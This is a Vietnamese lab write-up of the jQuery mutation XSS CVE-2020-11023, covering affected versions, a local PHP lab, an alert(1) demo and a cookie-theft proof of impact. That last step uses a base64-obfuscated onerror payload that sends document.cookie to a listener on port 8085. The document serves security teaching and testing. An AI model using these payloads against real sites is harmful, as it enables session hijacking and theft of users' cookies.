## CVE‑2020‑11023 – jQuery DOM‑based XSS (Mutation XSS)
1 Tổng quan lỗ hổng

- CVE ID: CVE‑2020‑11023

- Thành phần ảnh hưởng: jQuery

- Phiên bản bị ảnh hưởng: jQuery từ 1.0.3 đến trước 3.5.0

- Loại lỗ hổng: DOM‑based XSS

- Mô tả: Trong các phiên bản jQuery nói trên, việc truyền HTML từ nguồn không tin cậy (kể cả đã qua “sanitize” thủ công) vào các phương thức thao tác DOM như: .html(), .append(), .before(), .after(),...  có thể dẫn đến thực thi JavaScript tùy ý. Nguyên nhân là do HTML prefilter của jQuery tự động biến đổi (mutate) HTML đầu vào trước khi chèn vào DOM, khiến các payload XSS vốn “không chạy” ban đầu được kích hoạt sau khi jQuery xử lý. Lỗi này đã được vá trong jQuery 3.5.0.

2 Build lab (môi trường thử nghiệm)
- Chuẩn bị: PHP, jQuery phiên bản < 3.5.0 (ví dụ: 3.4.1)

- Chạy lab: sudo php -S 127.0.0.1:80

3 Demo khai thác (Exploit)

- Payload (URL‑encoded): /><img src=x onerror=alert(1)>

- Truy cập: http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=alert(1)%3E

- Khai thác:

1. Truy cập URL trên

2. Nhấn nút “Thêm qua .html()”

3. Hộp thoại alert(1) xuất hiện

- Đánh cắp cookie (Proof of Impact)

B1: Khởi động server nhận dữ liệu sudo python3 -m http.server 8085

B2: Payload /><img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))>

Giải mã Base64: document.location="http://127.0.0.1:8085/?c="+document.cookie

URL đầy đủ: http://127.0.0.1/?value=/%3E%3Cimg%20src=x%20onerror=eval(atob(%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xMjcuMC4wLjE6ODA4NS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ==%27))%3E

Bước 3: Kết quả

Nhấn nút “Thêm qua .html()”

Trên terminal Python sẽ thấy request chứa cookie

4 Phân tíc

- Payload ban đầu:

/><img src=x onerror=alert(1)>

Khi browser parse trực tiếp: có thể không chạy

Khi jQuery xử lý: jQuery prefilter HTML

Tự động: đóng thẻ, sắp xếp lại node, di chuyển attribute

Kết quả: DOM sau xử lý khác DOM ban đầu, event handler onerror được kích hoạt
